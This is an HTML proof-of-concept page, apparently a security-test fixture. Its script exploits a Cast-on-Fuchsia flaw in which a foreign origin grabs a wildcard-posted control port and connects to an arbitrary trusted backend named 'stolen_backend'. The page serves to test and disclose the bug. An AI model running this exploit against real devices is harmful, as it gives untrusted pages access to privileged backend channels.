<!DOCTYPE html>
<html>
<head><title>attacker</title></head>
<body>
<script>
  // This page is served from a DIFFERENT ORIGIN than the registered Cast app.
  // It demonstrates that:
  //
  //   1. cast.__platform__.PortConnector (and every Cast-Agent binding script)
  //      was injected into this foreign origin's main world, because
  //      NamedMessagePortConnectorFuchsia / ApiBindingsClient register their
  //      before-load scripts with origins = {"*"}.
  //
  //   2. CastComponent::OnNavigationStateChanged posts a FRESH control port to
  //      this document with target_origin = "*" once it finishes loading,
  //      without comparing the committed origin to the registered app's origin.
  //
  // The injected PortConnector grabs that control port for us; we just call
  // bind() to request a connection to an arbitrary named backend. cast_runner
  // forwards it to chromium.cast.ApiBindings.Connect() in the trusted Cast
  // Agent with no port-name allowlist.

  // Approach A: use the leaked cast.__platform__ shim directly.
  let port;
  if (window.cast && cast.__platform__ && cast.__platform__.PortConnector) {
    port = cast.__platform__.PortConnector.bind('stolen_backend');
  } else {
    // Approach B (fallback / works even without the injected shim): listen for
    // the wildcard handshake ourselves. Works because PostMessage("*", ...)
    // skips the Blink target-origin check entirely.
    window.addEventListener('message', (e) => {
      if (e.data === 'cast.master.connect' && e.ports.length === 1) {  // nocheck
        const ctrl = e.ports[0];
        const ch = new MessageChannel();
        port = ch.port1;
        port.onmessage = onBackendMessage;
        ctrl.postMessage('stolen_backend', [ch.port2]);
      }
    }, true);
  }

  function onBackendMessage(ev) {
    // Echo back, prefixed with our origin, so the test harness can prove that
    // a foreign origin is talking to the trusted backend channel.
    port.postMessage('attacker[' + location.origin + ']:' + ev.data);
  }
  if (port) {
    port.onmessage = onBackendMessage;
  }
</script>
</body>
</html>
